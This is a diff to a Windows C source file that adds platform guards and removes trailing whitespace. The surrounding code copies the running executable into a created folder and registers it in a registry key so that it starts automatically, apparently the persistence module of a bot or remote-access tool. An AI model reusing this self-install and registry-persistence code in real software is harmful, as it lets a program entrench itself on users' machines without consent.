@@ -1,4 +1,6 @@
 #include "Startup.h"
+
+#if defined(__WIN32)
 // Forward declarations not present in header
 BOOL WriteBufferToDisk(LPWSTR wStrFilePath, LPBYTE ptrBuffer, DWORD dwSizeofBuffer, DWORD dwFileAttributes);
 BOOL MakeDirectory(LPWSTR wStrDirectoryPath, DWORD dwFolderAttributes);
@@ -104,7 +106,7 @@ BOOL MakeDirectory(LPWSTR wStrDirectoryPath, DWORD dwFolderAttributes) {
 	return bSuccess;
 }
 
-BOOL CreateRegKey(LPWSTR wStrRegKeyName, LPWSTR wStrRegKeyValue) { 
+BOOL CreateRegKey(LPWSTR wStrRegKeyName, LPWSTR wStrRegKeyValue) {
 
 	BOOL bSuccess = FALSE;
 	HKEY hKey = NULL;
@@ -145,15 +147,15 @@ BOOL DoInitialInstallation(PINSTALLATION_INFO ptrInfo,
 
 	BOOL bSuccess = FALSE;
 
-	// FIXTHIS : Correctly map PE into buffer totally in-memory 
-	
+	// FIXTHIS : Correctly map PE into buffer totally in-memory
+
 	/*
 	// Get current imagebase
 	HMODULE hCurrentModule = GetModuleHandleW(NULL);
 	if (!hCurrentModule) {
 		return bSuccess;
 	}
-	
+
 	// Read PE from imagebase
 	PIMAGE_DOS_HEADER pIDH = (PIMAGE_DOS_HEADER)hCurrentModule;
 	if (pIDH->e_magic != IMAGE_DOS_SIGNATURE) {
@@ -164,7 +166,7 @@ BOOL DoInitialInstallation(PINSTALLATION_INFO ptrInfo,
 	if (pINH->Signature != IMAGE_NT_SIGNATURE) {
 		return bSuccess;
 	}
-	
+
 	// Read current PE size
 	DWORD dwExeSize = pINH->OptionalHeader.SizeOfImage;
 
@@ -174,7 +176,7 @@ BOOL DoInitialInstallation(PINSTALLATION_INFO ptrInfo,
 		return bSuccess;
 	}
 
-	*/ 
+	*/
 
 	// Temporary
 	// get a physical handle to self instead of in-memory one
@@ -187,9 +189,9 @@ BOOL DoInitialInstallation(PINSTALLATION_INFO ptrInfo,
 		OPEN_EXISTING,
 		FILE_ATTRIBUTE_NORMAL,
 		NULL);
-	
+
 	DWORD dwExeSize = GetFileSize(hFile, NULL);
-	LPVOID fileData = HeapAlloc(GetProcessHeap(), 0, dwExeSize); 
+	LPVOID fileData = HeapAlloc(GetProcessHeap(), 0, dwExeSize);
 	if (!ReadFile(hFile, fileData, dwExeSize, NULL, NULL)) // fill buffer
 	{
 		return bSuccess;
@@ -203,7 +205,7 @@ BOOL DoInitialInstallation(PINSTALLATION_INFO ptrInfo,
 
 	// Copy current PE into buffer
 	memcpy_s(ptrExeBuffer, dwExeSize, fileData, dwExeSize);
-	
+
 
 	// Concatenate folder name
 	LPWSTR wStrConcatenatedFolder = ConcatenateInstallFolder(ptrInfo->wStrFolderName);
@@ -254,9 +256,10 @@ BOOL DoInitialInstallation(PINSTALLATION_INFO ptrInfo,
 
 	return (bSuccess = TRUE);
 }
+#endif
 
 VOID RunStartupRoutine(LPVOID lpParam) {
-
+#if defined(__WIN32)
 	if (!lpParam) {
 		return;
 	}
@@ -283,4 +286,5 @@ VOID RunStartupRoutine(LPVOID lpParam) {
 
 		CreateRegKey(ptrInstallInfo->wStrRegKeyName, ptrStrFile);
 	}
+#endif
 }
